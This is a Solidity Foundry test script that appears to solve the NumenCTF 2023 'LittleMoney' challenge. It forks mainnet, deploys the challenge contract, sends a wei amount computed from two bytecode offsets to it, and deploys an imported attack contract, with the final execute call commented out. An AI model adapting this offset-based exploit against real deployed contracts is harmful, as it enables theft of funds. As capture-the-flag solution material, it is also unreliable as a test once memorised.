// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/NumenCTF_2023/LittleMoney/LittleMoney.sol";
import "./LittleMoneyAttack.sol";

contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    LittleMoney lm;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.startPrank(deployer, deployer);
        deal(attacker, 1 ether);

        lm = new LittleMoney();

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        solve();
        // console.log("isSolved:", lm.isSolved());
        vm.stopPrank();
    }

    function solve() public {
        uint emitAddress = 0x285;
        uint renounceAddress = 0x2be;
        uint offset = emitAddress > renounceAddress ? (emitAddress-renounceAddress):(renounceAddress-emitAddress);  // or brute force
        (bool success, ) = address(lm).call{value: offset}("");
        require(success);
        LittleMoneyAttack attack = new LittleMoneyAttack();
        // lm.execute(address(attack));
    }
}


